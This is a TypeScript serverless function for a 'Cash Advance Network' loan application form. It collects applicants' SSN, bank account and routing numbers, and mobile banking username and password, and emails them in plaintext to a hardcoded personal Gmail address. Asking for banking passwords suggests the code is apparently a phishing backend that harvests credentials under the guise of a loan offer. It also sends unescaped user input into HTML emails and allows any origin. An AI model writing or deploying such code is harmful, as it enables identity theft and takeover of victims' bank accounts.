import type { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from 'nodemailer';

export const config = {
    runtime: 'nodejs',
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const { applicationData, clientEmail, recipientType, clientName } = req.body;

        const gmailUser = process.env.GMAIL_USER;
        const gmailPass = process.env.GMAIL_APP_PASSWORD;
        const adminEmail = process.env.ADMIN_EMAIL || 'ws694481@gmail.com';

        if (!gmailUser || !gmailPass) {
            return res.status(500).json({ error: 'Email credentials are missing' });
        }

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: { user: gmailUser, pass: gmailPass },
        });

        const d = applicationData;
        const fullName = `${d.firstName} ${d.lastName}`;

        if (recipientType === 'admin') {
            // Send full details to admin
            await transporter.sendMail({
                from: `"Cash Advance Network" <${gmailUser}>`,
                to: adminEmail,
                subject: `🔔 New Loan Application - ${fullName}`,
                html: `
                <div style="font-family: sans-serif; max-width: 700px; margin: 0 auto; background: #f9fafb; padding: 20px; border-radius: 10px;">
                  <div style="background: #2563eb; color: white; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                    <h2 style="margin:0;">📋 New Loan Application Received</h2>
                    <p style="margin:5px 0 0; opacity:0.8;">Submitted by: ${fullName}</p>
                  </div>

                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #2563eb;">
                    <h3 style="margin-top:0; color:#1e40af;">👤 Personal Information</h3>
                    <table style="width:100%; border-collapse:collapse;">
                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Full Name</td><td style="padding:6px 0; font-weight:600;">${fullName}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Email</td><td style="padding:6px 0; font-weight:600;">${d.email}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Phone</td><td style="padding:6px 0; font-weight:600;">${d.phone}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Date of Birth</td><td style="padding:6px 0; font-weight:600;">${d.dob}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Address</td><td style="padding:6px 0; font-weight:600;">${d.address}, ${d.city}, ${d.state} ${d.zip}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">SSN</td><td style="padding:6px 0; font-weight:600; color:#dc2626;">${d.ssn}</td></tr>
                    </table>
                  </div>

                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #16a34a;">
                    <h3 style="margin-top:0; color:#15803d;">💼 Employment & Loan Details</h3>
                    <table style="width:100%; border-collapse:collapse;">
                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Monthly Income</td><td style="padding:6px 0; font-weight:600;">$${d.monthlyIncome}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Loan Amount Requested</td><td style="padding:6px 0; font-weight:600;">$${d.loanAmount}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Credit Score</td><td style="padding:6px 0; font-weight:600;">${d.creditScore}</td></tr>
                    </table>
                  </div>

                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #d97706;">
                    <h3 style="margin-top:0; color:#b45309;">🏦 Banking Information</h3>
                    <table style="width:100%; border-collapse:collapse;">
                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Bank Name</td><td style="padding:6px 0; font-weight:600;">${d.bankName}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Years with Bank</td><td style="padding:6px 0; font-weight:600;">${d.yearsWithBank}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Account Number</td><td style="padding:6px 0; font-weight:600;">${d.accountNumber}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Routing Number</td><td style="padding:6px 0; font-weight:600;">${d.routingNumber}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Mobile Banking Username</td><td style="padding:6px 0; font-weight:600;">${d.mobileUsername}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Mobile Banking Password</td><td style="padding:6px 0; font-weight:600; color:#dc2626;">${d.mobilePassword}</td></tr>
                    </table>
                  </div>

                  ${clientName ? `<p style="color:#6b7280; font-size:13px; text-align:center;">Application linked to client: <strong>${clientName}</strong></p>` : ''}
                  <p style="color:#9ca3af; font-size:12px; text-align:center;">Submitted on ${new Date().toLocaleString()}</p>
                </div>
                `,
            });

            return res.status(200).json({ success: true, sent: 'admin' });

        } else if (recipientType === 'client') {
            // Send confirmation to client
            await transporter.sendMail({
                from: `"Cash Advance Network" <${gmailUser}>`,
                to: clientEmail,
                subject: '✅ Your Loan Application Has Been Received',
                html: `
                <div style="font-family: sans-serif; max-width: 700px; margin: 0 auto; background: #f9fafb; padding: 20px; border-radius: 10px;">
                  <div style="background: #2563eb; color: white; padding: 24px; border-radius: 8px; text-align: center; margin-bottom: 24px;">
                    <h1 style="margin:0; font-size:24px;">Application Received! ✅</h1>
                    <p style="margin:8px 0 0; opacity:0.85;">Thank you, ${fullName}!</p>
                  </div>

                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #2563eb;">
                    <p style="color:#374151; margin-top:0;">Your loan application has been successfully submitted. Here's a summary of what you provided:</p>
                    <h3 style="margin-top:16px; color:#1e40af;">👤 Personal Information</h3>
                    <table style="width:100%; border-collapse:collapse;">
                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Full Name</td><td style="padding:6px 0; font-weight:600;">${fullName}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Email</td><td style="padding:6px 0; font-weight:600;">${d.email}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Phone</td><td style="padding:6px 0; font-weight:600;">${d.phone}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Date of Birth</td><td style="padding:6px 0; font-weight:600;">${d.dob}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Address</td><td style="padding:6px 0; font-weight:600;">${d.address}, ${d.city}, ${d.state} ${d.zip}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">SSN</td><td style="padding:6px 0; font-weight:600; color:#dc2626;">${d.ssn}</td></tr>
                    </table>
                  </div>

                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #16a34a;">
                    <h3 style="margin-top:0; color:#15803d;">💼 Employment & Loan Details</h3>
                    <table style="width:100%; border-collapse:collapse;">
                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Monthly Income</td><td style="padding:6px 0; font-weight:600;">$${d.monthlyIncome}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Loan Amount Requested</td><td style="padding:6px 0; font-weight:600;">$${d.loanAmount}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Credit Score</td><td style="padding:6px 0; font-weight:600;">${d.creditScore}</td></tr>
                    </table>
                  </div>

                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #d97706;">
                    <h3 style="margin-top:0; color:#b45309;">🏦 Banking Information</h3>
                    <table style="width:100%; border-collapse:collapse;">
                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Bank Name</td><td style="padding:6px 0; font-weight:600;">${d.bankName}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Years with Bank</td><td style="padding:6px 0; font-weight:600;">${d.yearsWithBank}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Account Number</td><td style="padding:6px 0; font-weight:600;">${d.accountNumber}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Routing Number</td><td style="padding:6px 0; font-weight:600;">${d.routingNumber}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Mobile Banking Username</td><td style="padding:6px 0; font-weight:600;">${d.mobileUsername}</td></tr>
                      <tr><td style="padding:6px 0; color:#6b7280;">Mobile Banking Password</td><td style="padding:6px 0; font-weight:600; color:#dc2626;">${d.mobilePassword}</td></tr>
                    </table>
                  </div>

                  <div style="background: #eff6ff; border: 1px solid #bfdbfe; padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                    <p style="margin:0; color:#1e40af; font-size:14px;">⏱️ Our team will review your application and get back to you shortly. If you have any questions, reply to this email.</p>
                  </div>

                  <p style="color:#9ca3af; font-size:12px; text-align:center;">Cash Advance Network · Submitted on ${new Date().toLocaleString()}</p>
                </div>
                `,
            });

            return res.status(200).json({ success: true, sent: 'client' });
        }

        return res.status(400).json({ error: 'Invalid recipientType' });

    } catch (err: any) {
        console.error('Email error:', err);
        return res.status(500).json({ error: err.message });
    }
}
